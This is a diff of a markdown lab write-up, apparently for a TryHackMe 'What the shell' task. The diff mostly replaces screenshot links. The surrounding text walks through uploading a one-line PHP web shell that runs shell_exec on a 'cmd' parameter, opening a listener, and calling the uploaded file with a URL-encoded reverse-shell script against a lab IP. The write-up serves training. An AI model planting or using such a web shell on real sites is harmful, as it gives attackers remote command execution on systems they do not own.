@@ -2,8 +2,9 @@ Now lets start the machine form the **TASK 15** and see what is has to offer to 
 
 **NOTE: As this is a THM task so there wont be any firewall blocking in real life scenarios it wont be this easy for sure!!**
 # USING SIMPLE PHP SCRIPT
+![Screenshot 2023-11-18 132628](https://github.com/Theincognitomode/What-the-shell/assets/73027020/2358218e-d63f-4e0e-bfbc-e5f964f45978)
 
-![image](https://github.com/Theincognitomode/What-the-shell/assets/73027020/47f2952e-a5fc-47e0-9c2c-2c2e9ec3453c)
+
 
 The website look something like this..
 
@@ -11,8 +12,10 @@ Now lets create a simple PHP script and upload it on the website
 
     <?php echo "<pre>" .shell_exec($_GET["cmd"]). "</pre>"; ?>
 
+
 Now lets visit the /upload/fname (in my case fname = revshell.php)
-![image](https://github.com/Theincognitomode/What-the-shell/assets/73027020/b5b4ec5d-5990-4f52-ba61-ef9c7852f563)
+![Screenshot 2023-11-18 132853](https://github.com/Theincognitomode/What-the-shell/assets/73027020/42b1a494-b726-4b66-a963-b6b657336851)
+
 
 Open the listern on any port that you desire..
 
@@ -30,7 +33,9 @@ Now convert this in url form and then modify the url
 
     http://10.10.109.254/uploads/revshell.php?cmd=<whole script that has been converted into url using any url encoder>
 
-![image](https://github.com/Theincognitomode/What-the-shell/assets/73027020/77dfb4b7-ebf0-4fe2-9459-cbdc35320d8d)
+
+![Screenshot 2023-11-18 133437](https://github.com/Theincognitomode/What-the-shell/assets/73027020/73c0ebfd-21ba-4307-b5a8-a200869b1c96)
+
 
 There we goo!! 
 
